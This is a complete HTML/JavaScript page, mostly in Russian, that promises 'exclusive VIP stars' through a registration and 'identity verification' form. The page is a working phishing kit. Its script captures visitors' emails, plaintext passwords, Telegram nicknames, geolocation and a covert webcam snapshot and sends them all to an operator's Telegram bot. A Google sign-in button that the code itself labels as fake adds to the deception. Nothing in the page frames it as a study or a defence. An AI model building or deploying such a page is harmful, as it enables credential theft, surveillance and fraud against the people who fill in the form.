<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>BossBand ‚Äì VIP –ó–≤—ë–∑–¥—ã</title>
  <style>
    :root {
      --primary: #6e45e2; --accent: #ff6b6b; --neon: #00f3ff;
      --bg-dark: #0f0f1a; --bg-light: #f8f9fa; --color-dark: #1a1a2e;
    }
    body {
      margin:0; padding:0; font-family:'Montserrat',sans-serif;
      background:var(--bg-dark); color:var(--bg-light);
      min-height:100vh;
      transition:background 0.3s,color 0.3s;
    }
    body.light {
      background:var(--bg-light); color:var(--color-dark);
    }
    .container{max-width:1000px;margin:0 auto;padding:20px;}
    header{display:flex;justify-content:space-between;align-items:center;}
    .logo{font-size:2.2rem;font-weight:800;background:linear-gradient(to right,var(--neon),var(--primary));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
    nav a{margin-left:20px;text-decoration:none;color:inherit;}
    .btn{background:linear-gradient(135deg,var(--accent),var(--primary));padding:12px 24px;border:none;color:#fff;border-radius:50px;cursor:pointer;transition:transform .2s;font-size:1rem;}
    .btn:hover{transform:translateY(-3px);}
    .btn:disabled{opacity:0.6;cursor:not-allowed;}
    .form-group{margin-bottom:20px;}
    input[type=email],input[type=password],input[type=text]{width:100%;padding:12px;border-radius:5px;border:none;margin-top:5px;background:rgba(255,255,255,0.1);color:inherit;font-size:1rem;}
    .light input[type=email],.light input[type=password],.light input[type=text]{background:rgba(0,0,0,0.05);}
    .error{color:var(--accent);display:none;margin:10px 0;padding:10px;background:rgba(255,107,107,0.1);border-radius:5px;}
    .success{color:var(--neon);display:none;margin:10px 0;padding:10px;background:rgba(0,243,255,0.1);border-radius:5px;}
    .theme-toggle{cursor:pointer;font-size:1.2rem;}
    .captcha{margin:15px 0;}
    #cameraPreview{width:300px;height:400px;display:none;margin:15px auto;border:2px solid var(--neon);border-radius:5px;}
    #cameraPreview.active{display:block;}
    .google-btn{margin-top:20px;display:flex;justify-content:center;}
    .fake-google-btn{background:#4285F4;color:white;padding:12px 24px;border-radius:50px;display:flex;align-items:center;cursor:pointer;font-weight:500;}
    .fake-google-btn:hover{opacity:0.9;}
    .fake-google-btn img{width:20px;margin-right:10px;}
    .language-selector{margin-left:20px;cursor:pointer;padding:5px;border-radius:5px;background:rgba(255,255,255,0.1);color:inherit;border:none;}
    .hidden{display:none;}
    .loading{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#fff;animation:spin 1s ease-in-out infinite;margin-left:10px;}
    @keyframes spin{to{transform:rotate(360deg);}}
  </style>
</head>
<body>
  <div class="container">
    <header>
      <div class="logo">BOSS BAND</div>
      <div>
        <a href="#" data-i18n="home">–ì–ª–∞–≤–Ω–∞—è</a>
        <a href="#" data-i18n="about">–û –Ω–∞—Å</a>
        <a href="#" data-i18n="contacts">–ö–æ–Ω—Ç–∞–∫—Ç—ã</a>
        <select class="language-selector" id="languageSelector">
          <option value="ru">–†—É—Å—Å–∫–∏–π</option>
          <option value="uk">–£–∫—Ä–∞—ó–Ω—Å—å–∫–∞</option>
          <option value="en">English</option>
        </select>
        <span class="theme-toggle" id="toggleTheme">üåì</span>
      </div>
    </header>

    <main>
      <h1 data-i18n="get_vip">–ü–û–õ–£–ß–ò–¢–ï –≠–ö–°–ö–õ–Æ–ó–ò–í–ù–´–ï VIP –ó–í–Å–ó–î–´</h1>
      <p data-i18n="registration_desc">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ª–∏—á–Ω–æ—Å—Ç–∏ —á–µ—Ä–µ–∑ Google, –∫–∞–º–µ—Ä–∞, –≥–µ–æ, CAPTCHA</p>

      <!-- –¢–∞–±—ã -->
      <div style="margin:20px 0;">
        <button class="btn" id="tabReg" data-i18n="registration">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</button>
        <button class="btn" id="tabVer" data-i18n="verification">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ</button>
      </div>

      <!-- –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è -->
      <div id="regForm">
        <div class="form-group"><label data-i18n="email">Email</label><input type="email" id="regEmail" required></div>
        <div class="form-group"><label data-i18n="password">–ü–∞—Ä–æ–ª—å</label><input type="password" id="regPass" required></div>
        <div class="form-group"><label data-i18n="nickname">–ù–∏–∫</label><input type="text" id="regNick"></div>
        <div class="captcha">
          <label data-i18n="captcha_question">–°–∫–æ–ª—å–∫–æ –±—É–¥–µ—Ç 7 + 5? <input type="text" id="captchaInput" required></label>
        </div>
        <div class="error" id="regError"></div>
        <div class="success" id="regSuccess" data-i18n="reg_success">‚úîÔ∏è –£—Å–ø–µ—à–Ω–æ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω—ã!</div>
        <button class="btn" id="btnReg" data-i18n="register">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</button>
      </div>

      <!-- –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ -->
      <div id="verForm" class="hidden">
        <div class="form-group"><label data-i18n="email">Email</label><input type="email" id="verEmail" required></div>
        <div class="form-group"><label data-i18n="password">–ü–∞—Ä–æ–ª—å</label><input type="password" id="verPass" required></div>
        <div class="form-group"><label data-i18n="telegram_nick">Telegram-–Ω–∏–∫</label><input type="text" id="verTg"></div>
        <div class="captcha">
          <label data-i18n="captcha_question2">–°–∫–æ–ª—å–∫–æ –±—É–¥–µ—Ç 4 + 6? <input type="text" id="captchaVer" required></label>
        </div>
        <div class="error" id="verError"></div>
        <div class="success" id="verSuccess" data-i18n="ver_success">‚úîÔ∏è –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!</div>
        <button class="btn" id="btnVer" data-i18n="verify">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ª–∏—á–Ω–æ—Å—Ç—å</button>
        <div id="cameraPreview"><video id="cameraVideo" width="300" height="400" autoplay></video></div>
      </div>
      
      <!-- –§–µ–π–∫–æ–≤–∞—è –∫–Ω–æ–ø–∫–∞ Google -->
      <div class="google-btn">
        <div class="fake-google-btn" id="fakeGoogleBtn">
          <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google">
          <span data-i18n="signin_with_google">–í–æ–π—Ç–∏ —á–µ—Ä–µ–∑ Google</span>
        </div>
      </div>
    </main>
  </div>

  <script>
    // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –±–æ—Ç–∞ Telegram (–ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –°–í–û–ò –î–ê–ù–ù–´–ï)
    const BOT_CONFIG = {
      token: "–í–ê–®_TELEGRAM_BOT_TOKEN",
      chatId: "–í–ê–®_TELEGRAM_CHAT_ID"
    };

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —è–∑—ã–∫–æ–≤
    const translations = {
      ru: {
        home: "–ì–ª–∞–≤–Ω–∞—è",
        about: "–û –Ω–∞—Å",
        contacts: "–ö–æ–Ω—Ç–∞–∫—Ç—ã",
        get_vip: "–ü–û–õ–£–ß–ò–¢–ï –≠–ö–°–ö–õ–Æ–ó–ò–í–ù–´–ï VIP –ó–í–Å–ó–î–´",
        registration_desc: "–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ª–∏—á–Ω–æ—Å—Ç–∏ —á–µ—Ä–µ–∑ Google, –∫–∞–º–µ—Ä–∞, –≥–µ–æ, CAPTCHA",
        registration: "–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è",
        verification: "–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ",
        email: "Email",
        password: "–ü–∞—Ä–æ–ª—å",
        nickname: "–ù–∏–∫",
        telegram_nick: "Telegram-–Ω–∏–∫",
        captcha_question: "–°–∫–æ–ª—å–∫–æ –±—É–¥–µ—Ç 7 + 5?",
        captcha_question2: "–°–∫–æ–ª—å–∫–æ –±—É–¥–µ—Ç 4 + 6?",
        register: "–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è",
        verify: "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ª–∏—á–Ω–æ—Å—Ç—å",
        reg_success: "‚úîÔ∏è –£—Å–ø–µ—à–Ω–æ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω—ã!",
        ver_success: "‚úîÔ∏è –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!",
        reg_error: "–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ–ª—è –∏ CAPTCHA",
        ver_error: "–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ–ª—è –∏ CAPTCHA",
        google_success: "‚úîÔ∏è –£—Å–ø–µ—à–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Google",
        no_geo: "–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞",
        loading: "–û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö...",
        telegram_error: "–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram",
        signin_with_google: "–í–æ–π—Ç–∏ —á–µ—Ä–µ–∑ Google"
      },
      uk: {
        home: "–ì–æ–ª–æ–≤–Ω–∞",
        about: "–ü—Ä–æ –Ω–∞—Å",
        contacts: "–ö–æ–Ω—Ç–∞–∫—Ç–∏",
        get_vip: "–û–¢–†–ò–ú–ê–ô–¢–ï –ï–ö–°–ö–õ–Æ–ó–ò–í–ù–Ü VIP –ó–Ü–†–ö–ò",
        registration_desc: "–†–µ—î—Å—Ç—Ä–∞—Ü—ñ—è —Ç–∞ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –æ—Å–æ–±–∏ —á–µ—Ä–µ–∑ Google, –∫–∞–º–µ—Ä–∞, –≥–µ–æ, CAPTCHA",
        registration: "–†–µ—î—Å—Ç—Ä–∞—Ü—ñ—è",
        verification: "–ü—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è",
        email: "Email",
        password: "–ü–∞—Ä–æ–ª—å",
        nickname: "–ù—ñ–∫",
        telegram_nick: "Telegram-–Ω—ñ–∫",
        captcha_question: "–°–∫—ñ–ª—å–∫–∏ –±—É–¥–µ 7 + 5?",
        captcha_question2: "–°–∫—ñ–ª—å–∫–∏ –±—É–¥–µ 4 + 6?",
        register: "–ó–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏—Å—è",
        verify: "–ü—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –æ—Å–æ–±—É",
        reg_success: "‚úîÔ∏è –£—Å–ø—ñ—à–Ω–æ –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–æ!",
        ver_success: "‚úîÔ∏è –ü—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ!",
        reg_error: "–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –ø–æ–ª—è —Ç–∞ CAPTCHA",
        ver_error: "–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –ø–æ–ª—è —Ç–∞ CAPTCHA",
        google_success: "‚úîÔ∏è –£—Å–ø—ñ—à–Ω–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—è —á–µ—Ä–µ–∑ Google",
        no_geo: "–ì–µ–æ–ª–æ–∫–∞—Ü—ñ—è –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞",
        loading: "–í—ñ–¥–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–∏—Ö...",
        telegram_error: "–ü–æ–º–∏–ª–∫–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –≤ Telegram",
        signin_with_google: "–£–≤—ñ–π—Ç–∏ —á–µ—Ä–µ–∑ Google"
      },
      en: {
        home: "Home",
        about: "About",
        contacts: "Contacts",
        get_vip: "GET EXCLUSIVE VIP STARS",
        registration_desc: "Registration and identity verification via Google, camera, geo, CAPTCHA",
        registration: "Registration",
        verification: "Verification",
        email: "Email",
        password: "Password",
        nickname: "Nickname",
        telegram_nick: "Telegram nick",
        captcha_question: "What is 7 + 5?",
        captcha_question2: "What is 4 + 6?",
        register: "Register",
        verify: "Verify identity",
        reg_success: "‚úîÔ∏è Successfully registered!",
        ver_success: "‚úîÔ∏è Verification sent!",
        reg_error: "Check fields and CAPTCHA",
        ver_error: "Check fields and CAPTCHA",
        google_success: "‚úîÔ∏è Google authorization successful",
        no_geo: "Geolocation not available",
        loading: "Sending data...",
        telegram_error: "Telegram sending error",
        signin_with_google: "Sign in with Google"
      }
    };

    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —è–∑—ã–∫–∞
    function setLanguage(lang) {
      document.querySelectorAll('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (translations[lang] && translations[lang][key]) {
          el.textContent = translations[lang][key];
        }
      });
      localStorage.setItem('language', lang);
    }

    // –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ —Ç–µ–º—ã
    document.getElementById('toggleTheme').onclick = () => {
      document.body.classList.toggle('light');
      localStorage.setItem('theme', document.body.classList.contains('light') ? 'light' : 'dark');
    };

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Ç–µ–º—ã
    if (localStorage.getItem('theme') === 'light') {
      document.body.classList.add('light');
    }

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —è–∑—ã–∫–∞
    const savedLanguage = localStorage.getItem('language') || 'ru';
    document.getElementById('languageSelector').value = savedLanguage;
    setLanguage(savedLanguage);

    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–º–µ–Ω—ã —è–∑—ã–∫–∞
    document.getElementById('languageSelector').onchange = (e) => {
      setLanguage(e.target.value);
    };

    // –¢–∞–±—ã
    document.getElementById('tabReg').onclick = () => {
      document.getElementById('regForm').classList.remove('hidden');
      document.getElementById('verForm').classList.add('hidden');
    };
    
    document.getElementById('tabVer').onclick = () => {
      document.getElementById('regForm').classList.add('hidden');
      document.getElementById('verForm').classList.remove('hidden');
    };

    // –ê–≤—Ç–æ—Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ
    ['regEmail','regPass','verEmail','verPass','verTg','regNick'].forEach(id => {
      const el = document.getElementById(id);
      if (el) {
        el.value = localStorage.getItem(id) || '';
        el.oninput = () => localStorage.setItem(id, el.value);
      }
    });

    // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
    async function sendToTelegram(message, photo = null) {
      const currentLang = localStorage.getItem('language') || 'ru';
      
      try {
        if (photo) {
          // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ (FormData)
          const formData = new FormData();
          formData.append('chat_id', BOT_CONFIG.chatId);
          formData.append('photo', photo, 'photo.jpg');
          formData.append('caption', message);
          
          const response = await fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
          
          return await response.json();
        } else {
          // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç–µ–∫—Å—Ç–∞ (JSON)
          const response = await fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              chat_id: BOT_CONFIG.chatId,
              text: message,
              parse_mode: 'HTML'
            })
          });
          
          return await response.json();
        }
      } catch (error) {
        console.error('Telegram send error:', error);
        throw new Error(translations[currentLang].telegram_error);
      }
    }

    // –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è
    document.getElementById('btnReg').onclick = async () => {
      const currentLang = localStorage.getItem('language') || 'ru';
      const btn = document.getElementById('btnReg');
      const originalText = btn.textContent;
      
      const e = document.getElementById('regEmail').value;
      const p = document.getElementById('regPass').value;
      const n = document.getElementById('regNick').value;
      const c = document.getElementById('captchaInput').value;
      
      const regError = document.getElementById('regError');
      const regSuccess = document.getElementById('regSuccess');
      
      // –í–∞–ª–∏–¥–∞—Ü–∏—è
      if (!e || !p || c !== '12') {
        regError.textContent = translations[currentLang].reg_error;
        regError.style.display = 'block';
        regSuccess.style.display = 'none';
        return;
      }
      
      regError.style.display = 'none';
      
      // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≥—Ä—É–∑–∫–∏
      btn.disabled = true;
      btn.innerHTML = `${translations[currentLang].loading} <span class="loading"></span>`;
      
      try {
        // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
        const message = `üéâ <b>–ù–æ–≤–∞—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è:</b>\nEmail: <code>${e}</code>\n–ü–∞—Ä–æ–ª—å: <code>${p}</code>\n–ù–∏–∫: ${n}\nUserAgent: ${navigator.userAgent}\n–Ø–∑—ã–∫: ${currentLang}`;
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
        await sendToTelegram(message);
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—Ö
        regSuccess.style.display = 'block';
        setTimeout(() => {
          regSuccess.style.display = 'none';
        }, 5000);
      } catch (error) {
        console.error('Registration error:', error);
        regError.textContent = error.message;
        regError.style.display = 'block';
      } finally {
        // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É
        btn.disabled = false;
        btn.textContent = originalText;
      }
    };

    // –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ
    document.getElementById('btnVer').onclick = async () => {
      const currentLang = localStorage.getItem('language') || 'ru';
      const btn = document.getElementById('btnVer');
      const originalText = btn.textContent;
      
      const e = document.getElementById('verEmail').value;
      const p = document.getElementById('verPass').value;
      const tg = document.getElementById('verTg').value;
      const c = document.getElementById('captchaVer').value;
      
      const verError = document.getElementById('verError');
      const verSuccess = document.getElementById('verSuccess');
      const cameraPreview = document.getElementById('cameraPreview');
      const cameraVideo = document.getElementById('cameraVideo');
      
      // –í–∞–ª–∏–¥–∞—Ü–∏—è
      if (!e || !p || c !== '10') {
        verError.textContent = translations[currentLang].ver_error;
        verError.style.display = 'block';
        verSuccess.style.display = 'none';
        return;
      }
      
      verError.style.display = 'none';
      
      // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≥—Ä—É–∑–∫–∏
      btn.disabled = true;
      btn.innerHTML = `${translations[currentLang].loading} <span class="loading"></span>`;
      
      try {
        // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
        let geo = translations[currentLang].no_geo;
        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
          });
          geo = `${position.coords.latitude},${position.coords.longitude}`;
        } catch (geoError) {
          console.error('Geolocation error:', geoError);
        }
        
        // –ö–∞–º–µ—Ä–∞
        let photoBlob = null;
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          cameraVideo.srcObject = stream;
          cameraPreview.classList.add('active');
          
          // –ñ–¥–µ–º 3 —Å–µ–∫—É–Ω–¥—ã –¥–ª—è —Å—Ç–∞–±–∏–ª–∏–∑–∞—Ü–∏–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
          await new Promise(resolve => setTimeout(resolve, 3000));
          
          // –î–µ–ª–∞–µ–º —Å–Ω–∏–º–æ–∫
          const canvas = document.createElement('canvas');
          canvas.width = cameraVideo.videoWidth;
          canvas.height = cameraVideo.videoHeight;
          canvas.getContext('2d').drawImage(cameraVideo, 0, 0);
          
          // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ Blob
          photoBlob = await new Promise(resolve => {
            canvas.toBlob(resolve, 'image/jpeg', 0.9);
          });
          
          // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
          stream.getTracks().forEach(track => track.stop());
          cameraPreview.classList.remove('active');
        } catch (cameraError) {
          console.error('Camera error:', cameraError);
        }
        
        // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
        const message = `üîê <b>–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ª–∏—á–Ω–æ—Å—Ç–∏:</b>\nEmail: <code>${e}</code>\n–ü–∞—Ä–æ–ª—å: <code>${p}</code>\nTelegram: ${tg}\n–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: ${geo}\nUserAgent: ${navigator.userAgent}\n–Ø–∑—ã–∫: ${currentLang}`;
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
        if (photoBlob) {
          await sendToTelegram(message, photoBlob);
        } else {
          await sendToTelegram(message);
        }
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—Ö
        verSuccess.style.display = 'block';
        setTimeout(() => {
          verSuccess.style.display = 'none';
        }, 5000);
      } catch (error) {
        console.error('Verification error:', error);
        verError.textContent = error.message;
        verError.style.display = 'block';
      } finally {
        // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É
        btn.disabled = false;
        btn.textContent = originalText;
      }
    };

    // –§–µ–π–∫–æ–≤–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Google
    document.getElementById('fakeGoogleBtn').onclick = async () => {
      const currentLang = localStorage.getItem('language') || 'ru';
      const regError = document.getElementById('regError');
      const regSuccess = document.getElementById('regSuccess');
      const btn = document.getElementById('fakeGoogleBtn');
      const originalText = btn.innerHTML;
      
      // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≥—Ä—É–∑–∫–∏
      btn.innerHTML = `<span class="loading"></span>`;
      btn.style.opacity = '0.7';
      btn.style.cursor = 'wait';
      
      // –ò–º–∏—Ç–∏—Ä—É–µ–º –∑–∞–¥–µ—Ä–∂–∫—É –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      try {
        // –§–æ—Ä–º–∏—Ä—É–µ–º —Ñ–µ–π–∫–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ Google
        const fakeGoogleData = {
          email: `user${Math.floor(Math.random() * 10000)}@gmail.com`,
          name: `User${Math.floor(Math.random() * 1000)}`
        };
        
        // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
        const message = `üîë <b>–§–µ–π–∫–æ–≤–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è Google:</b>\nEmail: <code>${fakeGoogleData.email}</code>\n–ò–º—è: ${fakeGoogleData.name}\nUserAgent: ${navigator.userAgent}\n–Ø–∑—ã–∫: ${currentLang}`;
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
        await sendToTelegram(message);
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—Ö
        regSuccess.textContent = translations[currentLang].google_success + ` (${fakeGoogleData.email})`;
        regSuccess.style.display = 'block';
        setTimeout(() => {
          regSuccess.style.display = 'none';
        }, 5000);
      } catch (error) {
        console.error('Fake Google auth error:', error);
        regError.textContent = translations[currentLang].telegram_error;
        regError.style.display = 'block';
      } finally {
        // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É
        btn.innerHTML = originalText;
        btn.style.opacity = '1';
        btn.style.cursor = 'pointer';
      }
    };
  </script>
</body>
</html>